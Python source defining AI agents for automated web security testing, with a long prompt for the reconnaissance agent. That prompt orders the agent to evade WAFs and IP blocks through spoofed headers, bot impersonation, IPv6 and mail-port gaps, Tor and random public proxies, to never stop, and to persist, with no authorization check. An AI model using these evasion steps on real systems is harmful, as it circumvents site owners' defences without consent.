"""CF_AI — 10 specialized WSTG agents, one per test category.

Each agent runs ONLY the checked tests for its category.
All use generic_linux_command for real execution — no hardcoded results.
"""
from __future__ import annotations
import os
from sdk.agents import Agent
from tools.generic_linux_command import generic_linux_command, read_file, write_file
from tools.js_secret_hunter import hunt_js_secrets

_TOOLS       = [generic_linux_command, read_file, write_file]
_JS_TOOLS    = [hunt_js_secrets, generic_linux_command, read_file, write_file]
_MODEL       = os.environ.get('CAI_MODEL', 'gpt-4o')
_VT_KEY      = os.environ.get('VIRUSTOTAL_API_KEY', '')
_SHODAN_KEY  = os.environ.get('SHODAN_API_KEY', '')

_BUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'

RULES = f"""
RULES:
- Execute every check with generic_linux_command using real commands.
- Never fabricate findings — only report what actual command output shows.
- If a tool is missing, substitute: curl / nmap / python3 one-liners.
- EVERY curl call MUST include: -L -4 --connect-timeout 8
  (-L follows Cloudflare/CDN redirects; without it all requests return empty or 301)
- EVERY curl call MUST include: -A "{_BUA}"
- EVERY curl call for page bodies MUST include:
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.9"
  -H "Referer: https://www.google.com/"
- Add -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt for cookie persistence (CF challenge cookies).
- Add -Pn --host-timeout 30s to nmap scans to prevent 90s+ hangs.
- Cloudflare / WAF bypass sequence (try in order if curl returns empty, 403, or 503):
  1. XFF spoof: -H "X-Forwarded-For: 66.249.66.1" -H "CF-Connecting-IP: 66.249.66.1"
  2. Googlebot UA: -A "Googlebot/2.1 (+http://www.google.com/bot.html)" -H "From: googlebot(at)googlebot.com"
  3. HTTP/1.0 downgrade: --http1.0
  4. Plain HTTP port 80 instead of HTTPS
  5. Fall back to passive recon (whois/dig/Wayback/crt.sh)
- OUTPUT FORMAT — use the format that matches severity:

  For CONFIRMED vulnerabilities (Medium / High / Critical), use this EXACT structure:

    ### [WSTG-ID]: Vulnerability Title
    **Summary:**
    - Vulnerable location: <exact endpoint, parameter, or file>
    - Overview: <one sentence — what is exposed or broken>
    - Impact: <what an attacker can do with this finding>
    - Severity: Critical / High / Medium
    - Prerequisites: <what is needed to exploit — e.g. "None", "valid auth token">

    **Exploitation Steps:**
    1. <description of what this step does>
       ```
       <exact curl / tool command to reproduce>
       ```
       Response:
       ```json
       <paste the EXACT server response — truncate after 30 lines>
       ```
    2. <next step if the exploit requires multiple requests>
       ```
       <command>
       ```

    **Proof of Impact:**
    - <specific data obtained or action taken — e.g. "Admin account created with User ID 65">
    - <second piece of evidence — e.g. "No authentication required — completely public endpoint">
    - <third — e.g. "10 user records exposed including emails, hashes, and deluxe tokens">

  For informational findings (Info / Low), a table row is sufficient:
    | WSTG-ID | Info/Low | Finding | Evidence |

- RECOVERY RULES — when a tool result contains a diagnostic message, READ it and immediately
  try the specific alternatives it suggests. NEVER stop and report failure — always attempt
  at least 3 different approaches before concluding an endpoint is unreachable:

  Empty response / no output:
    → Add -L to follow redirects; add -v to inspect response headers
    → Try XFF spoof: -H "X-Forwarded-For: 66.249.66.1"
    → Switch User-Agent to Googlebot: -A "Googlebot/2.1 (+http://www.google.com/bot.html)"
    → Try plain HTTP on port 80 instead of HTTPS
    → Use a Python one-liner with subprocess to avoid shell quoting issues

  Command produced no output:
    → Check if the tool is installed: which <tool>; if missing, use curl or python3 equivalent
    → Simplify the command — break a long one-liner into separate steps
    → Try -v or --verbose to get error details
    → Replace the shell command with a Python heredoc: python3 << 'EOF' ... EOF

  DNS / connection failure:
    → Try www. prefix if not already used (or remove it)
    → Try IP address directly: dig +short <domain>
    → Pivot to passive sources: curl "https://crt.sh/?q=<domain>&output=json" | python3 -m json.tool | head -40
    → Check Wayback Machine: curl "http://archive.org/wayback/available?url=<domain>" | python3 -m json.tool

  Timeout / IP blocked (geo-block, cloud-provider filter, or WAF ban):
    Try each in order — stop as soon as one succeeds:
    1. Different port:          curl ... <domain>:8080  or  <domain>:8443
    2. Tor exit node (changes IP every request):
         torsocks curl -L -4 --connect-timeout 15 -A "<UA>" <url>
         — or — curl --socks5 127.0.0.1:9050 -L --connect-timeout 15 -A "<UA>" <url>
         Check Tor is running first: systemctl status tor || tor &
    3. Proxychains (routes through proxy chain configured in /etc/proxychains4.conf):
         proxychains4 curl -L --connect-timeout 20 -A "<UA>" <url>
         Check config: cat /etc/proxychains4.conf | head -30
    4. Random public SOCKS5 proxy (test before use):
         curl --socks5 <proxy_ip>:<port> -L --connect-timeout 15 -A "<UA>" <url>
         Free proxy lists: curl -s "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=5000&country=all" | head -10
    5. Cloud IP rotation — request from a different source IP by running:
         python3 -c "import urllib.request; urllib.request.urlopen('<url>').read()" 2>&1 | head -20
    6. Passive pivot (always works): Shodan, crt.sh, Wayback Machine

  SSL error:
    → Add -k to skip cert verification
    → Try HTTP instead of HTTPS
    → Check cert details: openssl s_client -connect <domain>:443 -servername <domain> 2>/dev/null | head -30

  403 / WAF block:
    → Rotate User-Agent: try Googlebot, then curl/7.0, then empty
    → Add common bypass headers: -H "X-Originating-IP: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1"
    → Route through Tor: torsocks curl -L -4 --connect-timeout 15 -A "<UA>" <url>
    → Try proxychains: proxychains4 curl -L --connect-timeout 20 -A "<UA>" <url>
    → Path case variation: /Admin  /ADMIN  /admin/index.php

  PERSIST — keep trying alternatives until you get a real response from the target.
  Exhaust ALL of the above before concluding an endpoint is unreachable.
"""


def _agent(category: str, desc: str, instructions: str, max_turns: int = 25) -> Agent:
    return Agent(
        name=f'WSTG-{category}',
        description=desc,
        instructions=RULES + instructions,
        tools=_TOOLS,
        model=_MODEL,
        max_turns=max_turns,
    )


# ─────────────────────────────────────────────────────────────────────────────
# WSTG-INFO  (INFO-02, 06, 07, 08, 09, 10)
# ─────────────────────────────────────────────────────────────────────────────
_UA  = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
_REF = 'https://www.google.com/'
_SHARED = {
    'vercel.app': 'Vercel (serverless platform)',
    'netlify.app': 'Netlify (static hosting)',
    'github.io': 'GitHub Pages',
    'herokuapp.com': 'Heroku',
    'azurewebsites.net': 'Azure App Service',
    'appspot.com': 'Google App Engine',
    'cloudfront.net': 'AWS CloudFront',
    'pages.dev': 'Cloudflare Pages',
    'fly.dev': 'Fly.io',
    'railway.app': 'Railway',
    'render.com': 'Render',
    'onrender.com': 'Render',
    'supabase.co': 'Supabase',
}

INFO_AGENT = _agent('INFO', 'Information Gathering', f"""
You are the WSTG-INFO agent. Target: {{domain}}

══════════════════════════════════════════════════════════
MANDATORY EXECUTION ORDER — VIOLATING THIS IS A CRITICAL ERROR
══════════════════════════════════════════════════════════
STEP 1 — Run P1-A through P1-M IN ORDER (ALL of them, no skipping).
          These 13 commands contact third-party APIs — NOT the target.
          They CANNOT be blocked by the target's firewall. Run them even if HTTP is 100% blocked.
STEP 2 — Run Phase 2 origin bypass (MX, SPF, subdomain probe).
STEP 3 — Run Phase 3 HTTP cascade (but MAX 2 curl retries per IP — stop on repeated Exit 28).
STEP 4 — If the target is IP-blocked (Exit 28 / all ports filtered):
          SKIP Phase 3 entirely and go straight to Phase 4 Shodan pivot.
          NEVER stop and report without running Phase 4.

EXIT-28 PROTOCOL (when VPS IP is blocked by target firewall):
→ Stop all direct HTTP to the target IP immediately
→ Complete any remaining P1 commands (they don't need HTTP to target)
→ Run Phase 4: Shodan hostname bypass + Wayback/Google cache + IPv6
→ Try cloudscraper (P3-I) — its routing sometimes differs from curl
→ Report ONLY AFTER Phase 4 is complete

NEVER DO THIS:
✗ Never report "no results" or give up after HTTP failures — passive recon always finds something
✗ Never run dig with multiple record types in one command — use separate calls per type
✗ Never skip P1-A through P1-M (these are mandatory regardless of HTTP success)
✗ Never retry the same blocked IP more than 2 times

ADAPTIVE STRATEGY (adjust after Phase 1 findings):
- WordPress/Drupal/Joomla detected → run wpscan / droopescan after Phase 3
- Cloudflare detected → use cloudscraper bypass (P3-I) as primary HTTP method
- All ports filtered → Phase 4 is the entire recon — maximise it, find Shodan hostnames
- Subdomain discovered → treat each unique IP as a new target, run Phase 3 on it
- Staging/dev subdomain found → HIGH VALUE — enumerate it fully before main domain
- .com.au / .co.uk TLD → root domain is 3-part (e.g. petraequipment.com.au)

RULES:
1. Each generic_linux_command call is a NEW subprocess — never use $VARS set in a prior call.
2. ALL Python commands MUST be true single-liners with semicolons (no newlines, no heredoc, no try/except).
   gpt-4o collapses multi-line strings and heredocs — single-liners only.
3. For IP resolution use dig: subprocess.run(['dig','{{domain}}','A','+short'],...).stdout.strip().splitlines()[0]
   NEVER use socket.gethostbyname() — it raises exceptions that break single-liners.
4. When a command prints a [REASON] or [Exit N:] explanation, READ IT and act on it:
   - [REASON] rate-limited → continue — do not stop, move to next command
   - [REASON] VPS IP blocked → use the suggested fallback (certspotter, Wayback text, Google cache)
   - [REASON] domain new / never crawled → note it and continue — this is a finding, not a blocker
   - [Exit 0: ...] → empty response — try the debug recovery steps listed in the message
   - [Exit 28: ...] → IP blocked — trigger EXIT-28 PROTOCOL above immediately
5. For HTTP/JSON fetching use subprocess curl, NEVER urllib (urllib stalls on this VPS).
6. EVERY Python one-liner that calls json.loads() MUST have `import subprocess,json` — NEVER just `import subprocess`.
   Wrong: python3 -c "import subprocess; ... json.loads(...)"
   Right: python3 -c "import subprocess,json; ... json.loads(...)"
7. Every curl must include: -4 --connect-timeout 8 --max-time 15 -A "{_UA}"

SHARED PLATFORMS: {_SHARED}
If target is on a shared platform (vercel.app, netlify.app, github.io etc.) report it and
focus recon on the APPLICATION layer, not the platform infrastructure.

══════════════════════════════════════════════════════════
PHASE 1 — PASSIVE RECON (firewall-proof, run all of these)
══════════════════════════════════════════════════════════

# [P1-A] WHOIS — use root domain (handles .com.au / .co.uk style 2-part TLDs)
python3 -c "import subprocess,re; d='{{domain}}'; parts=d.split('.'); root='.'.join(parts[-3:]) if len(parts)>=3 and len(parts[-1])<=2 else '.'.join(parts[-2:]); out=subprocess.run(['whois',d],capture_output=True,text=True,timeout=15).stdout; lines=[l for l in out.splitlines() if re.search(r'registrar|registrant|name.server|created|expires|org|country|admin|tech',l,re.I)]; [print(l.strip()) for l in lines[:25]] or subprocess.run(['whois',root],capture_output=True,text=True,timeout=15); print('root domain:',root)"

# [P1-B] DNS records — one dig call per type (prevents multi-type misparse / "extra type option" warnings)
python3 -c "import subprocess; [print(t+':',subprocess.run(['dig','+short','{{domain}}',t],capture_output=True,text=True,timeout=8).stdout.strip() or '(none)') for t in ['A','AAAA','MX','TXT','NS','CNAME','SOA']]"

# [P1-C] SSL certificate — 7-stage firewall bypass cascade
# Exploits: IPv4-only firewall rules (IPv6 neglect), overly broad port allows,
# exposed management ports, stateful-rule gaps (nmap raw TCP vs curl TCP flow)

# Stage 1: curl 4-bypass (XFF spoof / www prefix / Googlebot UA / HTTP1.0)
python3 -c "import subprocess; ua='{_UA}'; kw=('subject:','issuer:','expire date:','subjectaltname','start date:'); skip=('verification failed','self signed','self-signed','alert','error','warning'); getcert=lambda args: [l.strip('* ') for l in subprocess.run(args,capture_output=True,text=True,timeout=13).stderr.splitlines() if any(k in l.lower() for k in kw) and not any(s in l.lower() for s in skip)]; b=['curl','-L','-4','-vsk','--max-time','10','--connect-timeout','6']; tries=[('XFF spoof',b+['-A',ua,'-H','X-Forwarded-For: 66.249.66.1','-H','X-Real-IP: 66.249.66.1','-H','Referer: https://www.google.com/','https://{{domain}}/']),('www prefix',b+['-A',ua,'https://www.{{domain}}/']),('Googlebot UA',b+['-A','Googlebot/2.1 (+http://www.google.com/bot.html)','-H','From: googlebot(at)googlebot.com','https://{{domain}}/']),('HTTP/1.0',b+['--http1.0','-A',ua,'https://{{domain}}/'])]; found=next(((label,r) for label,a in tries for r in [getcert(a)] if r),(None,[])); found[1] and [print(l) for l in found[1][:15]] and print('[SSL] obtained via: '+found[0]) or print('[SSL stage-1 FAIL] curl bypasses blocked — running openssl/IPv6/nmap fallbacks')"

# Stage 2: openssl s_client :443 — different TLS impl, bypasses source-IP filters targeting HTTP clients
# Uses nmap as instant fallback when openssl times out (nmap raw SYN bypasses some stateful filters)
python3 -c "import subprocess; r=subprocess.run('echo Q | timeout 10 openssl s_client -connect {{domain}}:443 -servername {{domain}} 2>/dev/null | grep -iE \"subject|issuer|notbefore|notafter|subjectAltName|san\" | head -15',shell=True,capture_output=True,text=True,timeout=14).stdout.strip(); print('[openssl:443]',r) if r else print('[openssl:443] no cert — port filtered or IP blocked')"
# Stage 3: Alternative SSL ports — overly broad firewall rules (test ports opened without source-IP restriction)
python3 -c "import subprocess; [print('[openssl:'+p+']',subprocess.run('echo Q | timeout 7 openssl s_client -connect {{domain}}:'+p+' -servername {{domain}} 2>/dev/null | grep -iE \"subject|issuer|notafter|san\" | head -8',shell=True,capture_output=True,text=True,timeout=10).stdout.strip() or 'no SSL / port closed') for p in ['8443','4443']]"

# Stage 4: IPv6 bypass — exploits IPv6 firewall neglect (IPv4 rules do NOT apply to IPv6 traffic)
python3 -c "import subprocess; ipv6=subprocess.run(['dig','+short','AAAA','{{domain}}'],capture_output=True,text=True,timeout=8).stdout.strip().splitlines(); ipv6=ipv6[0].strip() if ipv6 else ''; print('IPv6 address:',ipv6) if ipv6 else print('[IPv6] No AAAA record — target has no IPv6 or IPv6 firewall is also hardened'); r=subprocess.run('openssl s_client -connect ['+ipv6+']:443 -servername {{domain}} -brief </dev/null 2>&1 | grep -iE \"subject|issuer|notafter|san\" | head -10',shell=True,capture_output=True,text=True,timeout=15).stdout if ipv6 else ''; print('[IPv6 SSL]',r.strip()) if r.strip() else (ipv6 and print('[IPv6 SSL] connected but no cert data'))"

# Stage 5: nmap ssl-cert script — raw TCP SYN packets, bypasses stateful-rule gaps and some source-IP filters
nmap --script ssl-cert -p 443,8443,4443 -Pn -n --host-timeout 25s --script-timeout 10s {{domain}} 2>/dev/null | grep -iE "(subject|issuer|commonname|not after|not before|altname|dns)" | head -20 || echo "[nmap ssl-cert] timed out or all ports filtered"

# Stage 6: curl via IPv6 explicitly (firewall bypass — iptables rules are IPv4-only unless ip6tables also set)
python3 -c "import subprocess; ipv6=subprocess.run(['dig','+short','AAAA','{{domain}}'],capture_output=True,text=True,timeout=8).stdout.strip().splitlines(); ipv6=ipv6[0].strip() if ipv6 else ''; r=subprocess.run(['curl','-6','-vsk','--max-time','10','--connect-timeout','6','-A','{_UA}','https://{{domain}}/'],capture_output=True,text=True,timeout=15) if ipv6 else None; lines=[l.strip('* ') for l in (r.stderr.splitlines() if r else []) if any(k in l.lower() for k in ('subject:','issuer:','expire date:','subjectaltname')) and not any(s in l.lower() for s in ('failed','error','warning'))]; [print('[IPv6 curl SSL]',l) for l in lines[:10]] or (ipv6 and print('[IPv6 curl] no cert via IPv6')) or print('[IPv6 curl] skipped — no AAAA record')"

# Stage 7: SMTP/IMAPS/POP3S STARTTLS — mail certs often share SAN with web cert; mail ports have looser firewall rules
python3 -c "import subprocess; cmds=[('SMTP:587','echo Q | timeout 10 openssl s_client -connect {{domain}}:587 -starttls smtp 2>/dev/null | grep -iE \"subject|issuer|notafter|san\" | head -10'),('IMAPS:993','echo Q | timeout 10 openssl s_client -connect {{domain}}:993 2>/dev/null | grep -iE \"subject|issuer|notafter|san\" | head -10'),('POP3S:995','echo Q | timeout 10 openssl s_client -connect {{domain}}:995 2>/dev/null | grep -iE \"subject|issuer|notafter|san\" | head -10')]; [print('['+label+']',(subprocess.run(c,shell=True,capture_output=True,text=True,timeout=15).stdout.strip() or 'no TLS cert / port closed or filtered')) for label,c in cmds]"

# [P1-D] Certificate Transparency — crt.sh (tries %.domain then %25.domain) + certspotter fallback
python3 -c "import subprocess,json; domain='{{domain}}'; fetch=lambda url: subprocess.run(['curl','-4','-sk','--max-time','20','--connect-timeout','8','-A','Mozilla/5.0 (compatible)',url],capture_output=True,text=True,timeout=25).stdout.strip(); b1=fetch('https://crt.sh/?q=%.'+domain+'&output=json'); b2=(fetch('https://crt.sh/?q=%25.'+domain+'&output=json') if not b1.startswith('[') else b1); body=(b1 if b1.startswith('[') else b2); d=(json.loads(body) if body.startswith('[') else None); subs=sorted(set(v.replace('*.','') for e in (d or []) for v in e.get('name_value','').split() if domain in v)) if d else []; [print('[crt.sh]',s) for s in subs[:40]] or print('[crt.sh] 0 results — raw[0:120]:',body[:120] if body else '[REASON] Empty response from crt.sh — VPS IP may be rate-limited. Fallback: certspotter below.'); fb=fetch('https://api.certspotter.com/v1/issuances?domain='+domain+'&include_subdomains=true&expand=dns_names'); cs=(json.loads(fb) if fb.startswith('[') else None); [print('[certspotter]',n) for e in (cs or []) for n in e.get('dns_names',[]) if domain in n][:20] or print('[certspotter] 0 results' if isinstance(cs,list) else '[certspotter] failed: '+fb[:120])"

# [P1-E] Wayback Machine CDX — historical URLs + full diagnosis + text fallback
python3 -c "import subprocess,json; domain='{{domain}}'; r=subprocess.run(['curl','-4','-s','--max-time','20','--connect-timeout','8','-A','curl/7.88','http://web.archive.org/cdx/search/cdx?url='+domain+'/*&output=json&limit=40&fl=original,statuscode,mimetype&collapse=urlkey'],capture_output=True,text=True,timeout=25); body=r.stdout.strip(); rows=json.loads(body)[1:] if body.startswith('[') else []; [print(row[1],row[2],row[0]) for row in rows] or print('[Wayback CDX] 0 results —', '[REASON] Empty response: Wayback CDX API returned nothing. The VPS IP may be rate-limited by archive.org (they apply per-IP limits). Fix: retry in 60s.' if not body else '[REASON] Non-JSON response from Wayback CDX. Raw: '+body[:200] if not body.startswith('[') else '[REASON] Domain has 0 archived pages — either never crawled by the Wayback Machine, or excluded via robots.txt disallow. This is common for new domains and sites that actively block crawlers.'); r2=subprocess.run(['curl','-4','-s','--max-time','15','-A','curl/7.88','http://web.archive.org/cdx/search/cdx?url='+domain+'&output=text&limit=5'],capture_output=True,text=True,timeout=20) if not rows else None; r2 and (print('[Wayback text fallback]:',r2.stdout.strip()[:400]) if r2.stdout.strip() else print('[Wayback text fallback] also empty — domain genuinely has no Wayback archive.'))"

# [P1-F] Wayback Machine latest snapshot + diagnosis
python3 -c "import subprocess,json; domain='{{domain}}'; raw=subprocess.run(['curl','-4','-sk','--max-time','12','--connect-timeout','8','-A','curl/7.88','https://archive.org/wayback/available?url='+domain],capture_output=True,text=True,timeout=15).stdout.strip(); d=json.loads(raw) if raw.startswith('{{') else {{}}; snap=d.get('archived_snapshots',{{}}).get('closest',{{}}).get('url',''); print('Wayback snapshot:',snap) if snap else print('[Wayback snapshot] NONE —', '[REASON] Empty/non-JSON API response. archive.org may be unreachable from this VPS or rate-limiting. Raw: '+raw[:200] if not d else '[REASON] Wayback has never archived this domain. Try: (1) archive.org/web in browser (2) webcache.googleusercontent.com/search?q=cache:'+domain+' (3) commoncrawl.org')"

# [P1-G] HackerTarget — passive DNS + subdomain list (detects rate-limit error)
python3 -c "import subprocess; r=subprocess.run(['curl','-4','-s','--max-time','12','-A','{_UA}','https://api.hackertarget.com/hostsearch/?q={{domain}}'],capture_output=True,text=True,timeout=15).stdout.strip(); print(r[:2000]) if r and 'API count' not in r and 'error' not in r.lower()[:30] else print('(HackerTarget hostsearch: daily quota exceeded for this IP)')"
python3 -c "import subprocess; r=subprocess.run(['curl','-4','-s','--max-time','12','-A','{_UA}','https://api.hackertarget.com/dnslookup/?q={{domain}}'],capture_output=True,text=True,timeout=15).stdout.strip(); print(r[:2000]) if r and 'API count' not in r and 'error' not in r.lower()[:30] else print('(HackerTarget dnslookup: daily quota exceeded for this IP)')"

# [P1-H] Shodan — full authenticated API (open ports, banners, CVEs, tags, org, ASN)
python3 -c "import subprocess,json; ip=subprocess.run(['dig','+short','{{domain}}','A'],capture_output=True,text=True,timeout=10).stdout.strip().splitlines(); ip=ip[0] if ip else ''; print('Resolved IP:',ip); key='{_SHODAN_KEY}'; raw=subprocess.run(['curl','-4','-sk','--max-time','15','--connect-timeout','8','https://api.shodan.io/shodan/host/'+ip+'?key='+key],capture_output=True,text=True,timeout=20).stdout if (key and ip) else (subprocess.run(['curl','-4','-sk','--max-time','10','--connect-timeout','8','https://internetdb.shodan.io/'+ip],capture_output=True,text=True,timeout=15).stdout if ip else ''); d=json.loads(raw) if raw and raw.strip().startswith('{{') else {{}}; err=d.get('error',''); print('[Shodan error]',err) if err else [print(k+':',d.get(k,'')) for k in ['org','isp','asn','os','ports','tags']] and print('Vulns:',list(d.get('vulns',{{}}).keys())[:20]) and [print('  Port '+str(s.get('port',''))+'/'+str(s.get('transport','tcp'))+' ['+str(s.get('product',''))+' '+str(s.get('version',''))+']:',str(s.get('data',''))[:100]) for s in d.get('data',[])[:8]]"

# [P1-I] IP geolocation + ASN
python3 -c "import subprocess,json; ip_r=subprocess.run(['dig','+short','{{domain}}','A'],capture_output=True,text=True,timeout=10).stdout.strip(); ip=ip_r.splitlines()[0] if ip_r else ''; raw=subprocess.run(['curl','-4','-sk','--max-time','10','--connect-timeout','8','https://ipinfo.io/'+ip+'/json'],capture_output=True,text=True,timeout=15).stdout if ip else ''; d=json.loads(raw) if raw and raw.strip().startswith('{{') else {{}}; [print(k+':',d.get(k,'')) for k in ['ip','hostname','org','city','region','country','asn']]"

# [P1-J] jldc.me subdomain API (handles .com.au / .co.uk style 2-part TLDs)
python3 -c "import subprocess,json; dom='{{domain}}'; parts=dom.split('.'); root='.'.join(parts[-3:]) if len(parts)>=3 and len(parts[-1])<=2 else '.'.join(parts[-2:]); raw=subprocess.run(['curl','-4','-sk','--max-time','15','--connect-timeout','8','-A','curl/7.88','https://jldc.me/anubis/subdomains/'+root],capture_output=True,text=True,timeout=20).stdout; subs=json.loads(raw) if raw.strip().startswith('[') else []; [print(s) for s in subs[:30]] or print('(no jldc.me results for',root,')')"

# [P1-K] URLScan.io — screenshots, server headers, cookies, tech stack (no API key needed)
python3 -c "import subprocess,json; domain='{{domain}}'; r=subprocess.run(['curl','-4','-sk','--max-time','15','-A','curl/7.88','https://urlscan.io/api/v1/search/?q=domain:'+domain+'&size=5'],capture_output=True,text=True,timeout=20).stdout.strip(); d=json.loads(r) if r.strip().startswith('{{') else {{}}; results=d.get('results',[]); [print('[urlscan] url:',x.get('page',{{}}).get('url',''),'server:',x.get('page',{{}}).get('server',''),'ip:',x.get('page',{{}}).get('ip',''),'screenshot:',x.get('screenshot','')) for x in results[:5]] or print('[urlscan] no results for',domain)"

# [P1-L] AlienVault OTX — passive DNS, subdomains, threat intel
python3 -c "import subprocess,json; domain='{{domain}}'; r=subprocess.run(['curl','-4','-sk','--max-time','15','-A','curl/7.88','https://otx.alienvault.com/api/v1/indicators/domain/'+domain+'/passive_dns'],capture_output=True,text=True,timeout=20).stdout.strip(); d=json.loads(r) if r.strip().startswith('{{') else {{}}; records=d.get('passive_dns',[]); [print('[OTX passive_dns] hostname:',p.get('hostname',''),'addr:',p.get('address','')) for p in records[:15]] or print('[OTX] 0 passive DNS records for',domain); r2=subprocess.run(['curl','-4','-sk','--max-time','15','-A','curl/7.88','https://otx.alienvault.com/api/v1/indicators/domain/'+domain+'/url_list?limit=20'],capture_output=True,text=True,timeout=20).stdout.strip(); d2=json.loads(r2) if r2.strip().startswith('{{') else {{}}; [print('[OTX url]',u.get('url','')) for u in d2.get('url_list',[])[:10]]"

# [P1-M] BufferOver + RapidDNS — additional subdomain discovery
python3 -c "import subprocess,json; dom='{{domain}}'; parts=dom.split('.'); root='.'.join(parts[-3:]) if len(parts)>=3 and len(parts[-1])<=2 else '.'.join(parts[-2:]); r=subprocess.run(['curl','-4','-sk','--max-time','12','-A','curl/7.88','https://dns.bufferover.run/dns?q=.'+root],capture_output=True,text=True,timeout=15).stdout.strip(); d=json.loads(r) if r.strip().startswith('{{') else {{}}; entries=d.get('FDNS_A',[])+d.get('RDNS',[]); [print('[BufferOver]',e) for e in entries[:20]] or print('[BufferOver] no results for',root); r2=subprocess.run(['curl','-4','-sk','--max-time','15','-A','curl/7.88','https://rapiddns.io/subdomain/'+root+'?full=1'],capture_output=True,text=True,timeout=20).stdout; import re; subs=re.findall(r'<td>([a-z0-9\\-\\.]+\\.'+re.escape(root)+')</td>',r2,re.I); [print('[RapidDNS]',s) for s in sorted(set(subs))[:20]] or print('[RapidDNS] no results for',root)"

══════════════════════════════════════════════════════════
PHASE 2 — ORIGIN IP / CDN BYPASS DISCOVERY
══════════════════════════════════════════════════════════

# [P2-A] MX → origin IP (mail servers often bypass CDN)
dig {{domain}} MX +short 2>/dev/null | head -5
python3 -c "import subprocess; lines=subprocess.run(['dig','{{domain}}','MX','+short'],capture_output=True,text=True,timeout=10).stdout.splitlines(); hosts=[l.split()[-1].rstrip('.') for l in lines if l]; [print('MX',h,'->',subprocess.run(['dig',h,'A','+short'],capture_output=True,text=True,timeout=8).stdout.strip().split('\n')[0] or 'NXDOMAIN') for h in hosts[:3]]"

# [P2-B] SPF / TXT records reveal hosting infrastructure
dig {{domain}} TXT +short 2>/dev/null | grep -iE "spf|include|ip4|ip6"

# [P2-C] Subdomain probe — api.*, staging.*, dev.* often skip WAF
python3 -c "import subprocess; subs=['api','staging','dev','test','admin','mail','direct','origin','backend','app','beta']; [print('FOUND:',h,'->',a.splitlines()[0]) for s in subs for h in [s+'.{{domain}}'] for a in [subprocess.run(['dig',h,'A','+short'],capture_output=True,text=True,timeout=3).stdout.strip()] if a]"

══════════════════════════════════════════════════════════
PHASE 3 — HTTP BYPASS CASCADE
NOTE: If curl returns exit code 28 (timeout) repeatedly it means the server
is DROPPING packets from this VPS IP (IP allowlist / geo-block / cloud-provider
filtering). Stop retrying the same IP — skip straight to PHASE 4 PIVOT.
══════════════════════════════════════════════════════════

# [P3-PROBE] Quick reachability check (6s max — determines if Phase 3 is worth running)
curl -4 -sI https://{{domain}}/ --max-time 6 --connect-timeout 5 -A "{_UA}" -o /dev/null -w "TCP connect: %{{time_connect}}s  HTTP: %{{http_code}}\n" 2>/dev/null || echo "(exit code $? — IP likely filtered)"

# [P3-A] Browser-spoofed HTTP headers (most effective bypass)
curl -4 -sI https://{{domain}}/ --max-time 8 -A "{_UA}" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.9" -H "Referer: {_REF}" -H "Upgrade-Insecure-Requests: 1" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt 2>/dev/null

# [P3-B] XFF header injection (whitelist / loopback bypass)
curl -4 -sI https://{{domain}}/ --max-time 8 -A "{_UA}" -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "CF-Connecting-IP: 127.0.0.1" -H "True-Client-IP: 127.0.0.1" 2>/dev/null

# [P3-C] HTTP 1.0 downgrade (some WAFs only inspect HTTP/1.1+)
curl -4 --http1.0 -sI https://{{domain}}/ --max-time 8 -A "{_UA}" 2>/dev/null

# [P3-D] Plain HTTP port 80
curl -4 -sI http://{{domain}}/ --max-time 8 -A "{_UA}" 2>/dev/null

# [P3-E] whatweb fingerprinting
whatweb -a 3 --colour=never https://{{domain}}/ 2>/dev/null | head -20 || whatweb -a 1 --colour=never http://{{domain}}/ 2>/dev/null | head -15 || echo "(whatweb not available)"

# [P3-F] WAF detection
wafw00f https://{{domain}}/ 2>/dev/null | head -15 || echo "(wafw00f not available)"

# [P3-G] Tor proxy bypass
curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip --max-time 6 2>/dev/null | grep -q IsTor && curl --socks5 127.0.0.1:9050 -sI https://{{domain}}/ --max-time 20 -A "{_UA}" 2>/dev/null || echo "(Tor not available)"

# [P3-H] Bot UA bypass (Googlebot/Bingbot often whitelisted by WAFs)
curl -4 -sI https://{{domain}}/ --max-time 8 -A "Googlebot/2.1 (+http://www.google.com/bot.html)" -H "From: googlebot(at)googlebot.com" 2>/dev/null
curl -4 -sI https://{{domain}}/ --max-time 8 -A "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 2>/dev/null

# [P3-I] Cloudscraper — Python CF bypass + UA rotation (works when curl is blocked by JS challenge or IP filter)
python3 -c "import cloudscraper,sys; s=cloudscraper.create_scraper(browser={{'browser':'chrome','platform':'windows','desktop':True}}); r=s.get('https://{{domain}}/',timeout=20,verify=False); print('Status:',r.status_code); print('Headers:',dict(r.headers)); print(r.text[:2000])" 2>&1 || echo "[cloudscraper] not installed — run: pip3 install cloudscraper"
python3 -c "import cloudscraper; s=cloudscraper.create_scraper(browser={{'browser':'firefox','platform':'windows'}}); r=s.get('https://{{domain}}/',timeout=20,verify=False); [print(l) for l in r.text.splitlines()[:60] if l.strip()]" 2>&1 | head -40

# [P3-J] Tech fingerprint from HTML (when site is partially reachable)
curl -L -4 -sk --max-time 15 -A "{_UA}" -H "Referer: {_REF}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt https://{{domain}}/ 2>/dev/null | grep -iEo "(wordpress|drupal|joomla|magento|shopify|woocommerce|laravel|django|rails|react|angular|vue\\.?js|next\\.?js|nuxt|gatsby|symfony|codeigniter|yii|zend|asp\\.net|java|python|ruby|php|nginx|apache|iis|node)" | sort -u | head -20 || echo "[P3-J] No tech fingerprint from live page — site blocked"

══════════════════════════════════════════════════════════
PHASE 4 — PIVOT (run when exit code 28 / IP filtered)
If the target server drops all packets from this VPS, pivot to alternate assets.
The biggest finding is often the alternate asset — not the blocked main domain.
══════════════════════════════════════════════════════════

